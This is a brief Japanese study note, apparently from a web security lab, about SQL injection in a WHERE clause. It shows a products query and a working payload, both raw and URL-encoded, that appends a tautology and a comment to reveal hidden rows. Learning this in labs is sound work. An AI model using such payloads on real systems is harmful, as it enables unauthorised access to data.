## ## WHERE 句の SQL インジェクション脆弱性により、隠しデータの取得
- SQL文
```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```
ユーザが操作できるのはgiftsの値だけ。

- Payload
```
?category=Gifts' or 1=1-- <-スペース必要
↓エンコードするとこうなる。
?category=Gifts'%20or%201%3d1--%20
```
